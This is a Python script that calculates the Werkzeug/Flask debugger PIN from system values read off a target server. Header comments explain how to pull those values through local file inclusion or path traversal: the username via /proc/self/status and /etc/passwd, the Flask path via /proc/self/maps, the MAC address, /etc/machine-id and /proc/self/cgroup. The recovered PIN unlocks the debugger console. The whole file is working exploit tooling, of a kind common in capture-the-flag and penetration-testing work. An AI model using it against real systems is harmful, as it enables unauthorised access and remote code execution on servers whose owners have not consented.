#!/usr/bin/env python3
# =============================================================================
# WERKZEUG DEBUGGER PIN CALCULATOR
# All inputs are raw copy-paste values read from the target via LFI/traversal.
# =============================================================================
#
# EXAMPLE COMMAND (replace values with what you read from the target):
#
#   python3 werkzeug_pin_calc.py \
#     --username dev \
#     --mod-path /home/dev/app/venv/lib/python3.12/site-packages/flask/__init__.py \
#     --mac 24:4b:fe:ba:e7:b2 \
#     --machine-id 8d3a36cdcb6a4c069d15f3b8f5835ea0 \
#     --cgroup "0::/user.slice/user-1000.slice/session-3.scope"
#
# =============================================================================
# WHERE TO GET EACH VALUE
# =============================================================================
#
# --username
#   Step 1: read /proc/self/status  →  find the line "Uid: 1000 ..."
#   Step 2: read /etc/passwd        →  find the line where field 3 = that UID
#                                       format: username:x:UID:GID:...
#   Shortcut: if --mod-path contains /home/<name>/... the username is right there.
#
# --mod-path
#   Primary:  read /proc/self/maps  →  grep for "flask" — the full path is listed
#   Fallback: read /proc/self/environ  →  look for VIRTUAL_ENV or PYTHONPATH,
#             then Flask is at <that path>/lib/pythonX.Y/site-packages/flask/__init__.py
#   Common locations to try if the above are unreadable:
#     /usr/local/lib/python3.x/dist-packages/flask/__init__.py
#     /usr/lib/python3/dist-packages/flask/__init__.py
#     /opt/venv/lib/python3.x/site-packages/flask/__init__.py
#     /home/<user>/venv/lib/python3.x/site-packages/flask/__init__.py
#     /app/venv/lib/python3.x/site-packages/flask/__init__.py
#
# --mac
#   Primary:  read /sys/class/net/eth0/address  →  paste the result as-is
#   If eth0 doesn't exist: read /proc/net/dev first to see interface names,
#   then read /sys/class/net/<iface>/address for the right one.
#   Common interface names: eth0, eth1, ens33, ens3, enp0s3, lo
#   Note: lo (loopback) MAC is always 00:00:00:00:00:00 — not useful, skip it.
#
# --machine-id
#   Primary:  read /etc/machine-id          →  one line, 32 hex chars
#   Fallback: read /proc/sys/kernel/random/boot_id  (changes on reboot)
#   Paste only the content, not the filename.
#
# --cgroup  (optional — for containers/Docker, often changes the PIN)
#   Read /proc/self/cgroup  →  paste the FIRST line only
#   Werkzeug takes the last segment after the final "/" from that line.
#   On bare metal this is usually something like:
#     0::/user.slice/user-1000.slice/session-3.scope
#   In Docker it looks like:
#     12:devices:/docker/a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8
#   If the server is not in a container this value often has no meaningful
#   last segment — try with and without it if the PIN does not work.
#
# =============================================================================

import hashlib
import argparse
from itertools import chain


def mac_to_int(mac: str) -> int:
    return int(mac.replace(":", "").replace("-", ""), 16)


def build_machine_id(machine_id: str, cgroup_line: str = "") -> bytes:
    result = machine_id.strip().encode()
    if cgroup_line:
        last_segment = cgroup_line.strip().rpartition("/")[2]
        result += last_segment.encode()
    return result


def calculate_pin(
    username: str,
    mod_path: str,
    mac_int: int,
    machine_id: bytes,
    modname: str = "flask.app",
    app_name: str = "Flask",
) -> str:
    probably_public_bits = [username, modname, app_name, mod_path]
    private_bits = [str(mac_int), machine_id]

    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode()
        h.update(bit)
    h.update(b"cookiesalt")
    h.update(b"pinsalt")

    num = f"{int(h.hexdigest(), 16):09d}"[:9]

    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            pin = "-".join(
                num[x: x + group_size].rjust(group_size, "0")
                for x in range(0, len(num), group_size)
            )
            break
    else:
        pin = num

    return pin


def main():
    parser = argparse.ArgumentParser(
        description="Calculate Werkzeug debugger PIN from copy-pasted target values"
    )
    parser.add_argument("--username",   required=True, help="OS user running Flask (from /proc/self/status + /etc/passwd)")
    parser.add_argument("--mod-path",   required=True, help="Absolute path to flask/__init__.py on the target (from /proc/self/maps)")
    parser.add_argument("--mac",        required=True, help="MAC address as-is from /sys/class/net/<iface>/address")
    parser.add_argument("--machine-id", required=True, help="Raw content of /etc/machine-id")
    parser.add_argument("--cgroup",     default="",    help="First line of /proc/self/cgroup (optional, needed for containers)")
    args = parser.parse_args()

    mac_int = mac_to_int(args.mac)
    machine_id_bytes = build_machine_id(args.machine_id, args.cgroup)

    pin = calculate_pin(
        username=args.username,
        mod_path=args.mod_path,
        mac_int=mac_int,
        machine_id=machine_id_bytes,
    )

    print(f"\n  PIN: {pin}\n")
    print(f"  username   : {args.username}")
    print(f"  mod_path   : {args.mod_path}")
    print(f"  mac (int)  : {mac_int}")
    print(f"  machine_id : {machine_id_bytes.decode(errors='replace')}\n")


if __name__ == "__main__":
    main()
